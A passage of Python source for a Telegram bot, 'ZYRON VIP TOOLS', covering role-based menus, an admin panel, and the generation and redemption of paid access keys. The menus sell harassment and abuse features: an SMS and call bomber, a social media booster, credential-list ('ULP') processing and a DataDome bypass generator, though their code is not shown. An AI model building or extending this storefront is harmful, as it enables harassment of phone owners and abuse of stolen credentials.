                    [InlineKeyboardButton(f"📢 ᴊᴏɪɴ {REQUIRED_CHANNEL_2}", url=f"https://t.me/{REQUIRED_CHANNEL_2.lstrip('@')}")],
                    [InlineKeyboardButton("✅ ᴠᴇʀɪғʏ ᴊᴏɪɴ", callback_data="verify_join")]
                ])
                if update.callback_query:
                    try:
                        await safe_edit(update.callback_query.message, 
                            gate_text, reply_markup=gate_kb, parse_mode="Markdown"
                        )
                    except Exception:
                        await current_message.reply_text(
                            gate_text, reply_markup=gate_kb, parse_mode="Markdown"
                        )
                else:
                    await current_message.reply_text(
                        gate_text, reply_markup=gate_kb, parse_mode="Markdown"
                    )
                return

    now = datetime.datetime.now().strftime("%b %d, %Y • %I:%M %p")

    if is_at_least_role(user_id, "owner"):
        total_users = len(USER_ACCESS)
        active_keys = len(ACCESS_KEYS)
        welcome_msg = (
            f"👑  *ZYRON VIP TOOLS*  `v{BOT_VERSION}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"🕐  `{now}`\n"
            f"⚡  Uptime  ›  `{get_uptime()}`\n"
            f"👥  Users  ›  `{total_users}`   🔑  Keys  ›  `{active_keys}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"Welcome back, *{escape_md(user.first_name)}*  👑\n"
            "Support  ›  @ZyronDevv "
        )
        reply_markup = ReplyKeyboardMarkup([
            ["📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs", "📊 ᴍʏ sᴛᴀᴛɪsᴛɪᴄs"],
            ["🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ", "🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ"],
            ["🛠️ ᴜʟᴘ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ"],
            ["🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ"],
            ["💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ"],
            ["🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ"],
            ["👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ"],
            ["📣 sᴇɴᴅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ", "🔴 ʀᴇᴠᴏᴋᴇ ᴀᴄᴄᴇss"],
            ["📋 ᴜsᴇʀ ʟɪsᴛs", "💾 ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛᴜs"],
            ["🗑️ ᴅᴇʟᴇᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ", "🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ (ᴏɴ/ᴏғғ)"],
            ["👥 ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs"],
            ["📥 ᴛᴏᴏʟs", "💬 ғᴇᴇᴅʙᴀᴄᴋ ʜᴇʀᴇ"],
            ["🔗 ʀᴇғᴇʀʀᴀʟ"],
            ["🐍 TUTS FOR PYTHON"],
        ], resize_keyboard=True, input_field_placeholder="ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ...")

    elif is_at_least_role(user_id, "reseller"):
        access_status = "✅ Active" if has_access(user_id) else "❌ No Access"
        welcome_msg = (
            f"🌟  *ZYRON VIP TOOLS*  `v{BOT_VERSION}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"Welcome, *{escape_md(user.first_name)}*  ·  🌟 Reseller\n"
            f"🔐  Access  ›  `{access_status}`\n"
            f"🕐  `{now}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "Support  ›  @ZyronDevv "
        )
        reply_markup = ReplyKeyboardMarkup([
            ["📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs", "📊 ᴍʏ sᴛᴀᴛɪsᴛɪᴄs"],
            ["🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ", "🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ"],
            ["🛠️ ᴜʟᴘ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ"],
            ["🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ"],
            ["💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ"],
            ["🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ"],
            ["🔑 ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ", "📋 ᴍʏ ʀᴇғᴇʀʀᴀʟ sᴛᴀᴛs"],
            ["📥 ᴛᴏᴏʟs", "ℹ️ ʜᴇʟᴘ & ɪɴғᴏ"],
            ["🔗 ʀᴇғᴇʀʀᴀʟ"],
            ["💬 ғᴇᴇᴅʙᴀᴄᴋ ʜᴇʀᴇ"],
            ["🐍 TUTS FOR PYTHON"],
        ], resize_keyboard=True, input_field_placeholder="ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ...")

    else:
        if MAINTENANCE_MODE:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nBack online shortly.  Contact  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
            return

        access_status = "✅ Active" if has_access(user_id) else "❌ No Access"
        welcome_msg = (
            f"✨  *ZYRON VIP TOOLS*  `v{BOT_VERSION}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"Hello, *{escape_md(user.first_name)}*  👋\n"
            f"🔐  Access  ›  `{access_status}`\n"
            f"🕐  `{now}`\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "No key yet?  Buy one  ›  @ZyronDevv "
        )
        reply_markup = ReplyKeyboardMarkup([
            ["📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs", "📊 ᴍʏ sᴛᴀᴛɪsᴛɪᴄs"],
            ["🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ", "🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ"],
            ["🛠️ ᴜʟᴘ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ"],
            ["🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ"],
            ["💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ"],
            ["🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ"],
            ["📥 ᴛᴏᴏʟs", "ℹ️ ʜᴇʟᴘ & ɪɴғᴏ"],
            ["🔗 ʀᴇғᴇʀʀᴀʟ"],
            ["💬 ғᴇᴇᴅʙᴀᴄᴋ ʜᴇʀᴇ"],
            ["🐍 TUTS FOR PYTHON"],
        ], resize_keyboard=True, input_field_placeholder="ᴄʜᴏᴏsᴇ ᴀɴ ᴏᴘᴛɪᴏɴ...")

    await current_message.reply_text(
        welcome_msg,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

    logging.info(f"▶ /start uid={user_id} role={USER_ROLES.get(user_id,'user')}")

# ========== ADMIN FUNCTIONS ==========
async def admin_panel(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("admin_panel called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  Owner only.", parse_mode="Markdown")
        return
    
    db_stats, total_lines = get_database_stats()
    active_users = len([uid for uid in USER_ACCESS.keys() if has_access(uid)])
    total_users = len(USER_ACCESS)
    available_keys = len(ACCESS_KEYS)
    
    now = datetime.datetime.now().strftime("%b %d, %Y • %I:%M %p")
    admin_text = (
        f"👑  *ADMIN PANEL*  ·  v{BOT_VERSION}\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"🕐  `{now}`  ·  ⚡ `{get_uptime()}`\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"👥  Users   ›  `{total_users}` total  /  `{active_users}` active\n"
        f"🔑  Keys    ›  `{available_keys}` available\n"
        f"🗄️  DB      ›  `{total_lines:,}` lines\n"
        f"🛠️  Maint   ›  {'*ON* 🔴' if MAINTENANCE_MODE else 'OFF 🟢'}\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"*Database Health*\n"
    )
    
    for db_name, count in db_stats.items():
        status = "🟢" if count > 1000 else "🟡" if count > 100 else "🔴" if count > 0 else "⚫"
        admin_text += f"  {status}  {db_name}  ›  `{count:,}`\n"
    
    keyboard = [
        [InlineKeyboardButton("🔑 ɢᴇɴᴇʀᴀᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ", callback_data="admin_gen_key_single")],
        [InlineKeyboardButton("🗝️ ɢᴇɴᴇʀᴀᴛᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴋᴇʏs", callback_data="admin_gen_key_multi")],
        [InlineKeyboardButton("📋 ᴜsᴇʀ ʟɪsᴛs", callback_data="admin_users"),
         InlineKeyboardButton("🔴 ʀᴇᴠᴏᴋᴇ ᴜsᴇʀ/ᴋᴇʏ", callback_data="admin_revoke")],
        [InlineKeyboardButton("🗑️ ʀᴇᴠᴏᴋᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴜsᴇʀs", callback_data="admin_revoke_multi_keys")],
        [InlineKeyboardButton("📣 sᴇɴᴅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ", callback_data="admin_announce"),
         InlineKeyboardButton("💾 ʙᴀᴄᴋᴜᴘ ᴅᴀᴛᴀ", callback_data="admin_backup")],
        [InlineKeyboardButton("🔄 ʀᴇʟᴏᴀᴅ ᴅᴀᴛᴀʙᴀsᴇs", callback_data="admin_reload"),
         InlineKeyboardButton("🗑️ ᴅᴇʟᴇᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ", callback_data="admin_delete_single_key")],
        [InlineKeyboardButton("🛠 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ ᴏᴘᴛɪᴏɴs", callback_data="show_maintenance_options")],
        [InlineKeyboardButton("👥 ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs", callback_data="admin_manage_roles")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await safe_edit(current_message, admin_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(admin_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_key_command(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("generate_key_command called with no effective message.")
        return

    user_id = update.effective_user.id
    if not is_at_least_role(user_id, "reseller"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌  *Access Denied*  ·  You do not have permission to generate keys.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌  *Access Denied*  ·  You do not have permission to generate keys.", parse_mode="Markdown")
        return

    # Clear ALL competing awaiting states so the new flow has clean priority
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_KEY_USES.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_KEY_TIER.discard(user_id)
    context.user_data.pop("keys_to_generate_count", None)
    context.user_data.pop("key_max_uses", None)
    context.user_data.pop("key_tier", None)

    if update.callback_query and update.callback_query.data == "admin_gen_key_multi":
        AWAITING_KEY_COUNT.add(user_id)
        message_text = (
            "🗝️  *BATCH KEY GENERATOR*\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "How many keys do you want to generate?\n"
            "Max  ›  20 keys per batch\n"
            "All keys share the same duration.\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "Example: `5`, `10`, `20`"
        )
        keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        if update.callback_query:
            await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
        return

    AWAITING_KEY_USES.add(user_id)
    message_text = (
        "╔══════════════════════════╗\n"
        "║  🔑  ɢᴇɴᴇʀᴀᴛᴇ ᴀᴄᴄᴇss ᴋᴇʏ  ║\n"
        "╚══════════════════════════╝\n\n"
        "sᴇɴᴅ ᴛʜᴇ *ᴍᴀx ᴜsᴇs* ғᴏʀ ᴛʜɪs ᴋᴇʏ:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "┣ `1`   → sɪɴɢʟᴇ-ᴜsᴇ (ᴅᴇғᴀᴜʟᴛ)\n"
        "┣ `5`   → 5 ᴜsᴇʀs ᴄᴀɴ ʀᴇᴅᴇᴇᴍ\n"
        "┣ `10`  → 10 ᴜsᴇʀs ᴄᴀɴ ʀᴇᴅᴇᴇᴍ\n"
        "┗ `0`   → ᴜɴʟɪᴍɪᴛᴇᴅ ᴜsᴇs\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 ᴇxᴀᴍᴘʟᴇ: `1`, `5`, `20`, `0` (ᴜɴʟɪᴍɪᴛᴇᴅ)"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_key_count(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_COUNT:
        return

    try:
        key_count = int(update.message.text.strip())
        if not (1 <= key_count <= 20):
            await update.effective_message.reply_text("⚠️ Please enter a number between `1` and `20` for the key count.", parse_mode="Markdown")
            return
        
        context.user_data['keys_to_generate_count'] = key_count
        AWAITING_KEY_COUNT.discard(user_id)
        AWAITING_KEY_USES.add(user_id)

        message_text = (
            f"╔══════════════════════════╗\n"
            f"║  🗝️  ʙᴀᴛᴄʜ: *{key_count} ᴋᴇʏs*  ║\n"
            f"╚══════════════════════════╝\n\n"
            f"✅ {key_count} ᴋᴇʏs ᴄᴏɴғɪʀᴍᴇᴅ.\n\n"
            "ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ *ᴍᴀx ᴜsᴇs* ᴘᴇʀ ᴋᴇʏ:\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "┣ `1`   → sɪɴɢʟᴇ-ᴜsᴇ (ᴅᴇғᴀᴜʟᴛ)\n"
            "┣ `5`   → 5 ᴜsᴇʀs ᴄᴀɴ ʀᴇᴅᴇᴇᴍ\n"
            "┣ `10`  → 10 ᴜsᴇʀs ᴄᴀɴ ʀᴇᴅᴇᴇᴍ\n"
            "┗ `0`   → ᴜɴʟɪᴍɪᴛᴇᴅ ᴜsᴇs\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💡 ᴇxᴀᴍᴘʟᴇ: `1`, `5`, `20`, `0` (ᴜɴʟɪᴍɪᴛᴇᴅ)"
        )
        keyboard = [[InlineKeyboardButton("⬅️ Cancel", callback_data="cancel_action")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.effective_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

    except ValueError:
        await update.effective_message.reply_text("❌ *Invalid input!* Please send a valid *number* for the key count.", parse_mode="Markdown")

async def handle_key_uses(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_USES:
        return

    raw = update.message.text.strip()
    try:
        max_uses = int(raw)
        if max_uses < 0:
            raise ValueError
    except ValueError:
        await update.effective_message.reply_text("❌ *Invalid input!* Send a number like `1`, `5`, `20`, or `0` for unlimited.", parse_mode="Markdown")
        return

    context.user_data['key_max_uses'] = max_uses
    AWAITING_KEY_USES.discard(user_id)
    AWAITING_KEY_TIER.add(user_id)

    uses_label = "♾️ ᴜɴʟɪᴍɪᴛᴇᴅ" if max_uses == 0 else f"*{max_uses} ᴜsᴇ{'s' if max_uses != 1 else ''}*"
    message_text = (
        f"✅ ᴍᴀx ᴜsᴇs: {uses_label}\n\n"
        "🏷️ *sᴇʟᴇᴄᴛ ᴀᴄᴄᴇss ᴛɪᴇʀ* ғᴏʀ ᴛʜɪs ᴋᴇʏ:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🟢 *ʙᴀsɪᴄ*\n"
        "┣ 📂 ᴅᴀᴛᴀʙᴀsᴇ ɢᴇɴᴇʀᴀᴛᴏʀ\n"
        "┣ 🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ\n"
        "┣ 🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ\n"
        "┗ 📥 ᴛᴏᴏʟs ᴅᴏᴡɴʟᴏᴀᴅᴇʀ\n\n"
        "🟣 *ᴠɪᴘ* (ɪɴᴄʟᴜᴅᴇs ᴇᴠᴇʀʏᴛʜɪɴɢ ɪɴ ʙᴀsɪᴄ +)\n"
        "┣ 💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ\n"
        "┗ 🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 ʙᴀsɪᴄ", callback_data="genkey_tier_basic"),
         InlineKeyboardButton("🟣 ᴠɪᴘ",   callback_data="genkey_tier_vip")],
        [InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]
    ]
    await update.effective_message.reply_text(message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

async def handle_key_tier_callback(update: Update, context: CallbackContext):
    """Handles the 🟢 Basic / 🟣 VIP button press during key generation."""
    query = update.callback_query
    user_id = update.effective_user.id

    if user_id not in AWAITING_KEY_TIER:
        await safe_answer_callback(query)
        return

    tier = "vip" if query.data == "genkey_tier_vip" else "basic"
    context.user_data['key_tier'] = tier
    AWAITING_KEY_TIER.discard(user_id)
    AWAITING_KEY_DURATION.add(user_id)

    await safe_answer_callback(query, f"🏷️ Tier: {tier.upper()}")

    tier_label = "🟣 *VIP*" if tier == "vip" else "🟢 *BASIC*"
    message_text = (
        f"✅ ᴀᴄᴄᴇss ᴛɪᴇʀ: {tier_label}\n\n"
        "ɴᴏᴡ sᴇɴᴅ ᴛʜᴇ *ᴅᴜʀᴀᴛɪᴏɴ* ғᴏʀ ᴛʜɪs ᴋᴇʏ:\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "┣ `2m`        → 2 ᴍɪɴᴜᴛᴇs\n"
        "┣ `1h`        → 1 ʜᴏᴜʀ\n"
        "┣ `1d`        → 1 ᴅᴀʏ\n"
        "┣ `7d`        → 7 ᴅᴀʏs\n"
        "┣ `30d`       → 30 ᴅᴀʏs\n"
        "┗ `lifetime`  → ♾️ ᴘᴇʀᴍᴀɴᴇɴᴛ\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 ғᴏʀᴍᴀᴛ: `Xm` / `Xh` / `Xd`"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    current_message = query.message
    await safe_edit(current_message, message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")


async def handle_key_duration(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_DURATION:
        return

    duration_text = update.message.text.strip().lower()
    
    expires_at = None
    expiry_text = ""
    days = 0

    if duration_text == "lifetime":
        expires_at = None
        expiry_text = "*♾️ ʟɪғᴇᴛɪᴍᴇ*"
        days = 999999
    else:
        match = re.match(r"(\d+)([mdh])", duration_text)
        if not match:
            await update.effective_message.reply_text("❌ *Invalid format!* Please use `Xd`, `Xh`, `Xm`, or `lifetime` (e.g., `3d`, `24h`, `60m`).", parse_mode="Markdown")
            return

        value = int(match[1])
        unit = match[2]
        
        delta = datetime.timedelta()
        if unit == 'd':
            delta = datetime.timedelta(days=value)
            expiry_text = f"*🗓️ {value} day{'s' if value != 1 else ''}*"
            days = value
        elif unit == 'h':
            delta = datetime.timedelta(hours=value)
            expiry_text = f"*⏰ {value} hour{'s' if value != 1 else ''}*"
            days = value / 24
        elif unit == 'm':
            delta = datetime.timedelta(minutes=value)
            expiry_text = f"*⏱️ {value} minute{'s' if value != 1 else ''}*"
            days = value / (24 * 60)

        expires_at = (datetime.datetime.now() + delta).timestamp()

    num_keys_to_generate = context.user_data.get('keys_to_generate_count', 1)

    generated_keys_output = []
    for _ in range(num_keys_to_generate):
        while True:
            chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
            seg1 = ''.join(random.choices(chars, k=4))
            seg2 = ''.join(random.choices(chars, k=4))
            seg3 = ''.join(random.choices(chars, k=4))
            key = f"{KEY_PREFIX}{seg1}-{seg2}-{seg3}"
            if key not in ACCESS_KEYS and key not in USED_KEYS:
                break

        max_uses = context.user_data.get('key_max_uses', 1)
        key_tier = context.user_data.get('key_tier', 'basic')
        GLOBAL_STATS["keys_generated_total"] = GLOBAL_STATS.get("keys_generated_total", 0) + 1
        ACCESS_KEYS[key] = {
            "expires_at": expires_at,
            "days": days,
            "created_by": user_id,
            "created_at": datetime.datetime.now().isoformat(),
            "max_uses": max_uses,
            "use_count": 0,
            "tier": key_tier
        }
        generated_keys_output.append(f"`{key}`")
        GLOBAL_STATS["keys_generated_total"] += 1
        logging.info(f"🔑 Key generated by {user_id}: {key}")
        
    schedule_save()

    if num_keys_to_generate > 1:
        created_str = datetime.datetime.now().strftime('%b %d, %Y  %I:%M %p')
        numbered_keys = "\n".join(f"  {i+1:2}. `{k.strip('`')}`" for i, k in enumerate(generated_keys_output))
        _tier_disp = "🟣 VIP" if context.user_data.get('key_tier', 'basic') == 'vip' else "🟢 Basic"
        key_message_header = (
            f"╔══════════════════════════╗\n"
            f"║  🔑  ʙᴀᴛᴄʜ ᴋᴇʏs ɢᴇɴᴇʀᴀᴛᴇᴅ  ║\n"
            f"╚══════════════════════════╝\n\n"
            f"📦 ᴋᴇʏs: *{num_keys_to_generate}*  |  🏷️ ᴛɪᴇʀ: {_tier_disp}  |  ⏳ ᴠᴀʟɪᴅɪᴛʏ: {expiry_text}\n"
            f"📅 `{created_str}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        key_message_list = numbered_keys
        key_message_footer = (
            f"\n\n━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 ᴜsᴇs ᴘᴇʀ ᴋᴇʏ : {'♾️ ᴜɴʟɪᴍɪᴛᴇᴅ' if context.user_data.get('key_max_uses', 1) == 0 else str(context.user_data.get('key_max_uses', 1))}\n"
            f"📞 sᴜᴘᴘᴏʀᴛ: @ZyronDevv "
        )
        key_message = key_message_header + key_message_list + key_message_footer
    else:
        created_str = datetime.datetime.now().strftime('%b %d, %Y  %I:%M %p')
        key_raw = generated_keys_output[0].strip('`')
        _tier_disp = "🟣 VIP" if context.user_data.get('key_tier', 'basic') == 'vip' else "🟢 Basic"
        key_message = (
            f"╔══════════════════════════╗\n"
            f"║   🔑  ᴀᴄᴄᴇss ᴋᴇʏ ɢᴇɴᴇʀᴀᴛᴇᴅ   ║\n"
            f"╚══════════════════════════╝\n\n"
            f"🎫 `{key_raw}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🏷️ ᴛɪᴇʀ     : {_tier_disp}\n"
            f"⏳ ᴠᴀʟɪᴅɪᴛʏ  : {expiry_text}\n"
            f"📅 ᴄʀᴇᴀᴛᴇᴅ   : `{created_str}`\n"
            f"👥 ᴍᴀx ᴜsᴇs  : {'♾️ ᴜɴʟɪᴍɪᴛᴇᴅ' if context.user_data.get('key_max_uses', 1) == 0 else str(context.user_data.get('key_max_uses', 1))}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📤 sʜᴀʀᴇ ᴛʜɪs ᴋᴇʏ ᴡɪᴛʜ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍᴇʀ.\n"
            f"📞 sᴜᴘᴘᴏʀᴛ: @ZyronDevv "
        )

    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.effective_message.reply_text(key_message, reply_markup=reply_markup, parse_mode="Markdown")
    AWAITING_KEY_DURATION.discard(user_id)
    context.user_data.pop('keys_to_generate_count', None)
    context.user_data.pop('key_max_uses', None)
    context.user_data.pop('key_tier', None)

async def handle_enter_key(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_KEY_INPUT:
        return
    # Brute-force lockout check
    lockout_until = KEY_FAIL_LOCKOUT.get(user_id, 0)
    if lockout_until > time.time():
        mins_left = int((lockout_until - time.time()) / 60) + 1
        await update.effective_message.reply_text(
            f"🔒  *Locked Out*\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"Please wait *{mins_left} min* before trying again.\n"
            "Contact @ZyronDevv  if this is a mistake.",
            parse_mode="Markdown"
        )
        return

    # ── Brute-force protection ────────────────────────────────────
    now_ts = time.time()
    lockout_until = KEY_FAIL_LOCKOUT.get(user_id, 0)
    if now_ts < lockout_until:
        remaining = int(lockout_until - now_ts)
        await update.effective_message.reply_text(
            f"🔒  *Locked Out*\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"Please wait *{{remaining}}s* before trying again.\n"
            "Support  ›  @ZyronDevv ",
            parse_mode="Markdown"
        )
        return

    # Support /redeem command which injects the key via context rather than message.text
    _injected = context.user_data.pop("_injected_key", None)
    if _injected:
        key = _injected.strip()
    elif update.message and update.message.text:
        key = update.message.text.strip()
    else:
        AWAITING_KEY_INPUT.discard(user_id)
        return

    # ── Blacklisted key check (revoked/leaked keys) ───────────────────────────
    if key.upper() in BLACKLISTED_KEYS:
        AWAITING_KEY_INPUT.discard(user_id)
        await update.effective_message.reply_text(
            "🚫 *ᴛʜɪs ᴋᴇʏ ʜᴀs ʙᴇᴇɴ ʙʟᴀᴄᴋʟɪsᴛᴇᴅ* ᴀɴᴅ ɪs ɴᴏ ʟᴏɴɢᴇʀ ᴠᴀʟɪᴅ.\n"
            "ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ɪғ ʏᴏᴜ ʙᴇʟɪᴇᴠᴇ ᴛʜɪs ɪs ᴀɴ ᴇʀʀᴏʀ.",
            parse_mode="Markdown"
        )
        return

    if key in ACCESS_KEYS:
        key_data = ACCESS_KEYS[key]

        max_uses = key_data.get("max_uses", 1)  # 0 = unlimited
        use_count = key_data.get("use_count", 0)

        # Check if key has been fully used up
        if max_uses != 0 and use_count >= max_uses:
            await update.effective_message.reply_text(
                "╔══════════════════════════╗\n"
                "║  ❌  ᴋᴇʏ ғᴜʟʟʏ ʀᴇᴅᴇᴇᴍᴇᴅ  ║\n"
                "╚══════════════════════════╝\n\n"
                f"ᴛʜɪs ᴋᴇʏ ʜᴀs ʀᴇᴀᴄʜᴇᴅ ɪᴛs ᴍᴀxɪᴍᴜᴍ ᴏғ *{max_uses}* ᴜsᴇ(s).\n\n"
                "💡 ɢᴇᴛ ᴀ ɴᴇᴡ ᴋᴇʏ → @ZyronDevv ",
                parse_mode="Markdown"
            )
            AWAITING_KEY_INPUT.discard(user_id)
            return

        if key_data.get("days") == 999999:
            expires_at = None
            expiry_text = "*♾️ ʟɪғᴇᴛɪᴍᴇ*"
        else:
            days = key_data.get("days", 30)
            expires_at = (datetime.datetime.now() + datetime.timedelta(days=days)).timestamp()
            expiry_text = f"*🗓️ {days} day{'s' if days != 1 else ''}*"
        
        KEY_FAIL_COUNT.pop(user_id, None)  # clear fail counter on success
        KEY_FAIL_LOCKOUT.pop(user_id, None)

        # ── Apply role from key tier (Basic / VIP) ────────────────────────
        # Never downgrade reseller/owner/mini_admin — only adjust user/basic/vip tiers.
        key_tier = key_data.get("tier", "basic")  # default to basic for older keys
        new_role = "vip" if key_tier == "vip" else "basic"
        current_role = USER_ROLES.get(user_id, "user")
        PROTECTED_ROLES = ("reseller", "mini_admin", "owner")
        if current_role not in PROTECTED_ROLES:
            # Upgrade or set role; never downgrade vip->basic via a basic key redemption
